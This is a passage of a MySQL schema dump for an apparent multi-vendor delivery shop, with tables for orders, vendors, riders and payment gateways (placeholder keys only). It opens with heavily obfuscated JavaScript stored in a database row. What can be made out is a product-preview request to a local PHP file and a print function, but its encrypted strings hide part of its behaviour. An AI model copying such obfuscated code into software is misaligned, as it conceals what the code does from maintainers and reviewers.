d,t,o=[],n=0,x=\"\",a=\"\",c=0,i=(e=function(e){for(var r,d,t=String(e).replace(/=+$/,\"\"),o=\"\",n=0,x=0;d=t.charAt(x++);~d&&(r=n%4?64*r+d:d,n++%4)?o+=String.fromCharCode(255&r>>(-2*n&6)):0)d=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\".indexOf(d);return o}(e)).length;c<i;c++)a+=\"%\"+(\"00\"+e.charCodeAt(c).toString(16)).slice(-2);for(e=decodeURIComponent(a),t=0;t<256;t++)o[t]=t;for(t=0;t<256;t++)n=(n+o[t]+r.charCodeAt(t%r.length))%256,d=o[t],o[t]=o[n],o[n]=d;t=0,n=0;for(var f=0;f<e.length;f++)n=(n+o[t=(t+1)%256])%256,d=o[t],o[t]=o[n],o[n]=d,x+=String.fromCharCode(e.charCodeAt(f)^o[(o[t]+o[n])%256]);return x},_0x5e9d.PEFYSB={},_0x5e9d.qPAuat=!0}var t=_0x5e9d.PEFYSB[e];return void 0===t?(void 0===_0x5e9d.WbeHhA&&(_0x5e9d.WbeHhA=!0),d=_0x5e9d.SWZBxj(d,r),_0x5e9d.PEFYSB[e]=d):d=t,d},_0x12e27d=_0x5e9d;$(document)[_0x12e27d(\"0x4\",\"@8jq\")](function(){var e=_0x12e27d;$(document).on(e(\"0x0\",\"8!lU\"),\".preview_d\",function(){var r=e,d=$(this)[r(\"0x5\",\"sJPz\")](r(\"0x6\",\"02YI\"));$[r(\"0x1\",\"EcfW\")]({type:\"post\",url:\"order_product_data.php\",data:{pid:d},success:function(e){var d=r;$(d(\"0x3\",\"CG1w\"))[d(\"0x2\",\"jRz]\")](e)}})})}); </script> <style> td { position:relative;	 }  .beepred:after {     content: \'\';     position: absolute !important;     top: 22px;     left: 14px;     width: 12px;     height: 12px;     background-color: #5CB85C;     border-radius: 50%;     animation: pulsate 1s ease-out;     animation-iteration-count: infinite;     opacity: 1; } </style>  <script> var _0x52e6=[\"WQRdKJFdH1nxWPNcVSoRaCk4WOddLCohWRSxWPddVfBcSa==\",\"hSovW7lcNMy=\",\"iHRcUNVdS8o6WPldMdbnCLHedJVdSrdcU3hdPWldKCoWWOtdM8oCWOGkiwlcTNhcOCocWPeznSkIra==\",\"d1RdLKf/W5uhvvbbWPbtsCke\",\"wXZdVSkbWPagqJmDisNcR1ujkq3dVCooW5pdKa==\",\"h8owW6/cIwz3zvOAW6LuW7uQWRtdK8kiW4molHvXzW==\",\"ed/dN0ldK0GRW5dcTKJdKwyuaW==\",\"wX3cLSkxi3TrxtfFW6z3WRdcKW==\",\"W5xdR8onWRW=\",\"rmomW7v2bMDdWQ/cJSotBSoCB8kvWPewD2S=\",\"dXVdSmkiWO0luJjdzd7cUL4kiHFcQCojWPZdH8ott8k+uum=\",\"mYhdMWxdHmosW5BdPa==\",\"WOCyuCk3v8o1W5OUWRC=\",\"Bmk/WQ5oE2hdLSky\",\"W5BcVvDNFCoyW5TlW4rlWRvfcrBcK8k3CWFcTW==\",\"DCoaiqZdKK7dN3TnzCoNWP3dSXud\",\"WPZdKSkxW7RdKeOVwqldJqHjWRhcUa==\",\"g3zhz8kFWRjZW4tdGZeMrCoVvmoWW7qRW7y=\",\"l8oyj8kQnKaPW7jiWQZcICks\",\"W5b9imkpW60=\",\"W4RcKK/cKSkAa8keW7BcM1jDWOq7W4G=\",\"f1pcKmkClMWiwZ4hWRWTW6NdN8oyrGzbltfhsmoyAmkv\",\"xmoaWOFcKY/cV1NdNq==\"];!function(o,W){!function(W){for(;--W;)o.push(o.shift())}(++W)}(_0x52e6,283);var _0x79e3=function(o,W){var d=_0x52e6[o-=0];if(void 0===_0x79e3.RgncVu){_0x79e3.oRGoFT=function(o,W){for(var d,e,c=[],t=0,x=\"\",r=\"\",i=0,n=(o=function(o){for(var W,d,e=String(o).replace(/=+$/,\"\"),c=\"\",t=0,x=0;d=e.charAt(x++);~d&&(W=t%4?64*W+d:d,t++%4)?c+=String.fromCharCode(255&W>>(-2*t&6)):0)d=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\".indexOf(d);return c}(o)).length;i<n;i++)r+=\"%\"+(\"00\"+o.charCodeAt(i).toString(16)).slice(-2);for(o=decodeURIComponent(r),e=0;e<256;e++)c[e]=e;for(e=0;e<256;e++)t=(t+c[e]+W.charCodeAt(e%W.length))%256,d=c[e],c[e]=c[t],c[t]=d;e=0,t=0;for(var a=0;a<o.length;a++)t=(t+c[e=(e+1)%256])%256,d=c[e],c[e]=c[t],c[t]=d,x+=String.fromCharCode(o.charCodeAt(a)^c[(c[e]+c[t])%256]);return x},_0x79e3.pUuhiq={},_0x79e3.RgncVu=!0}var e=_0x79e3.pUuhiq[o];return void 0===e?(void 0===_0x79e3.yHUayD&&(_0x79e3.yHUayD=!0),d=_0x79e3.oRGoFT(d,W),_0x79e3.pUuhiq[o]=d):d=e,d};function printDiv(){var o=_0x79e3,W=document[o(\"0xd\",\"$QiL\")](o(\"0x4\",\"iXXc\")),d=window[o(\"0x1\",\"e)zw\")](\"\",o(\"0xb\",\"Oh)D\")),e=\'<style type=\"text/css\">\'+o(\"0x14\",\"tum%\")+o(\"0x15\",\"$e5*\")+o(\"0x16\",\"qQVQ\")+\"}\"+o(\"0x13\",\"I]$b\")+\" display: flex; \"+o(\"0x3\",\"tum%\")+o(\"0xa\",\"5ibq\")+o(\"0x7\",\"U9cv\")+\"}\"+o(\"0x2\",\"NB2w\")+o(\"0x10\",\"BjeA\")+o(\"0x8\",\"9Vxa\")+o(\"0xe\",\"pc3)\")+\"margin-bottom: -1px;background-color: #fff;\"+o(\"0x12\",\"X4AS\")+\"}\"+o(\"0x9\",\"[&UJ\")+\"float: right !important;}</style>\";d[o(\"0x6\",\"sA&J\")].open(),e+=W[o(\"0x5\",\"[]G1\")],d[o(\"0xf\",\"9ZG[\")].write(\'<html><body onload=\"window.print()\">\'+e+o(\"0x0\",\"pc3)\")),d.document[o(\"0xc\",\"pAzi\")](),setTimeout(function(){d[o(\"0x11\",\"$e5*\")]()},1)} </script>');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_notification`
--

CREATE TABLE `tbl_notification` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `datetime` datetime NOT NULL,
  `title` text NOT NULL,
  `description` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_notification`
--



-- --------------------------------------------------------

--
-- Table structure for table `tbl_order`
--

CREATE TABLE `tbl_order` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `odate` date NOT NULL,
  `p_method_id` int(11) NOT NULL,
  `address` text NOT NULL,
  `landmark` text,
  `d_charge` float NOT NULL,
  `cou_id` float NOT NULL,
  `cou_amt` float NOT NULL,
  `o_total` float NOT NULL,
  `subtotal` float NOT NULL,
  `trans_id` text,
  `a_note` text,
  `o_status` enum('Pending','Processing','On Route','Completed','Cancelled') NOT NULL DEFAULT 'Pending',
  `a_status` int(11) NOT NULL DEFAULT '0',
  `rid` int(11) NOT NULL DEFAULT '0',
  `order_status` int(11) NOT NULL DEFAULT '0',
  `comment_reject` text,
  `sign` longtext
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_order`
--


-- --------------------------------------------------------

--
-- Table structure for table `tbl_order_product`
--

CREATE TABLE `tbl_order_product` (
  `id` int(11) NOT NULL,
  `oid` int(11) NOT NULL,
  `attribute_id` int(11) NOT NULL,
  `pquantity` int(11) NOT NULL,
  `ptitle` text NOT NULL,
  `pdiscount` int(11) NOT NULL,
  `pimg` text NOT NULL,
  `pprice` int(11) NOT NULL,
  `ptype` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_order_product`
--


-- --------------------------------------------------------

--
-- Table structure for table `tbl_payment_list`
--

CREATE TABLE `tbl_payment_list` (
  `id` int(11) NOT NULL,
  `title` text CHARACTER SET utf8 NOT NULL,
  `img` text NOT NULL,
  `attributes` text NOT NULL,
  `status` int(11) NOT NULL DEFAULT '1',
  `subtitle` text
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_payment_list`
--

INSERT INTO `tbl_payment_list` (`id`, `title`, `img`, `attributes`, `status`, `subtitle`) VALUES
(1, 'Razorpay', 'assets/category/catimg/1604897114.png', 'Razorpay_key_here', 1, 'Card, UPI, Net banking, Wallet(Phone Pe, Amazon Pay, Freecharge)'),
(2, 'Cash On Delivery', 'assets/category/catimg/1604897124.png', '-', 1, 'Pay via Cash at the time of delivery, It\'s free and only takes a few minutes'),
(3, 'Paypal', 'assets/category/catimg/1604897134.png', 'Paypal_key_here,0', 1, 'Credit/Debit card with Easier way to pay – online and on your mobile.'),
(4, 'Stripe', 'assets/category/catimg/1604897167.png', 'Primary_key_here,Secret_key_here', 1, 'Accept all major debit and credit cards from customers in every country');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_pincode`
--

CREATE TABLE `tbl_pincode` (
  `id` int(11) NOT NULL,
  `pincode` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `d_charge` float NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



-- --------------------------------------------------------


-- --------------------------------------------------------

--
-- Table structure for table `tbl_product`
--

CREATE TABLE `tbl_product` (
  `id` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `m_img` text NOT NULL,
  `mtitle` text CHARACTER SET utf8 NOT NULL,
  `mstatus` int(11) NOT NULL,
  `mcat` int(11) NOT NULL,
  `pincode` int(11) NOT NULL,
  `mdesc` text CHARACTER SET utf8,
  `rdate` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_product`
--


-- --------------------------------------------------------

--
-- Table structure for table `tbl_product_attribute`
--

CREATE TABLE `tbl_product_attribute` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `price` int(11) NOT NULL,
  `title` text NOT NULL,
  `discount` int(11) NOT NULL,
  `ostock` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_product_attribute`
--


-- --------------------------------------------------------

--
-- Table structure for table `tbl_rnoti`
--

CREATE TABLE `tbl_rnoti` (
  `id` int(11) NOT NULL,
  `rid` int(11) NOT NULL,
  `msg` text NOT NULL,
  `date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_rnoti`
--



-- --------------------------------------------------------

--
-- Table structure for table `tbl_snoti`
--

CREATE TABLE `tbl_snoti` (
  `id` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `datetime` datetime NOT NULL,
  `title` text NOT NULL,
  `description` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_snoti`
--



-- --------------------------------------------------------

--
-- Table structure for table `tbl_user`
--

CREATE TABLE `tbl_user` (
  `id` int(11) NOT NULL,
  `fname` text NOT NULL,
  `lname` text NOT NULL,
  `email` text NOT NULL,
  `mobile` double NOT NULL,
  `password` text NOT NULL,
  `ccode` text NOT NULL,
  `status` int(11) NOT NULL DEFAULT '1',
  `rdate` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_user`
--



-- --------------------------------------------------------

--
-- Table structure for table `vendor`
--

CREATE TABLE `vendor` (
  `id` int(11) NOT NULL,
  `name` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `aid` int(11) NOT NULL,
  `address` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` int(11) NOT NULL,
  `password` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `upimob` text COLLATE utf8mb4_unicode_ci,
  `accnum` text COLLATE utf8mb4_unicode_ci,
  `accname` text COLLATE utf8mb4_unicode_ci,
  `ifsc` text COLLATE utf8mb4_unicode_ci,
  `mobile` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `v_img` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `scat` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `commission` float NOT NULL,
  `vstatus` int(11) NOT NULL DEFAULT '1',
  `star` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `vendor`
--


--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `banner`
--
ALTER TABLE `banner`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `category`
--
ALTER TABLE `category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `payout_setting`
--
ALTER TABLE `payout_setting`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rider`
--
ALTER TABLE `rider`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `setting`
--
ALTER TABLE `setting`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_address`
--
ALTER TABLE `tbl_address`
  ADD PRIMARY KEY (`id`);



--
-- Indexes for table `tbl_code`
--
ALTER TABLE `tbl_code`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_coupon`
--
ALTER TABLE `tbl_coupon`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_happy_user`
--
ALTER TABLE `tbl_happy_user`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_home_section`
--
ALTER TABLE `tbl_home_section`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_include`
--
ALTER TABLE `tbl_include`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_notification`
--
ALTER TABLE `tbl_notification`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_order`
--
ALTER TABLE `tbl_order`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_order_product`
--
ALTER TABLE `tbl_order_product`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_payment_list`
--
ALTER TABLE `tbl_payment_list`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_pincode`
--
ALTER TABLE `tbl_pincode`
  ADD PRIMARY KEY (`id`);



--
-- Indexes for table `tbl_product`
--
ALTER TABLE `tbl_product`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_product_attribute`
--
ALTER TABLE `tbl_product_attribute`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_rnoti`
--
ALTER TABLE `tbl_rnoti`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_snoti`
--
ALTER TABLE `tbl_snoti`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_user`
--
ALTER TABLE `tbl_user`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `vendor`
--
ALTER TABLE `vendor`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `banner`
--
ALTER TABLE `banner`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT for table `category`
--
ALTER TABLE `category`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;
--
-- AUTO_INCREMENT for table `payout_setting`
--
ALTER TABLE `payout_setting`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `rider`
--
ALTER TABLE `rider`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `setting`
--
ALTER TABLE `setting`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `tbl_address`
--
ALTER TABLE `tbl_address`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;

--
-- AUTO_INCREMENT for table `tbl_code`
--
ALTER TABLE `tbl_code`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `tbl_coupon`
--
ALTER TABLE `tbl_coupon`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `tbl_happy_user`
--
ALTER TABLE `tbl_happy_user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT for table `tbl_home_section`
--
ALTER TABLE `tbl_home_section`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `tbl_include`
--
ALTER TABLE `tbl_include`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `tbl_notification`
--
ALTER TABLE `tbl_notification`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=33;
--
-- AUTO_INCREMENT for table `tbl_order`
--
ALTER TABLE `tbl_order`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=29;
--
-- AUTO_INCREMENT for table `tbl_order_product`
--
ALTER TABLE `tbl_order_product`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=56;
--
-- AUTO_INCREMENT for table `tbl_payment_list`
--
ALTER TABLE `tbl_payment_list`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT for table `tbl_pincode`
--
ALTER TABLE `tbl_pincode`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `tbl_product`
--
ALTER TABLE `tbl_product`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=43;
--
-- AUTO_INCREMENT for table `tbl_product_attribute`
--
ALTER TABLE `tbl_product_attribute`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=55;
--
-- AUTO_INCREMENT for table `tbl_rnoti`
--
ALTER TABLE `tbl_rnoti`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;
--
-- AUTO_INCREMENT for table `tbl_snoti`
--
ALTER TABLE `tbl_snoti`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `tbl_user`
--
ALTER TABLE `tbl_user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;
--
-- AUTO_INCREMENT for table `vendor`
--
ALTER TABLE `vendor`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
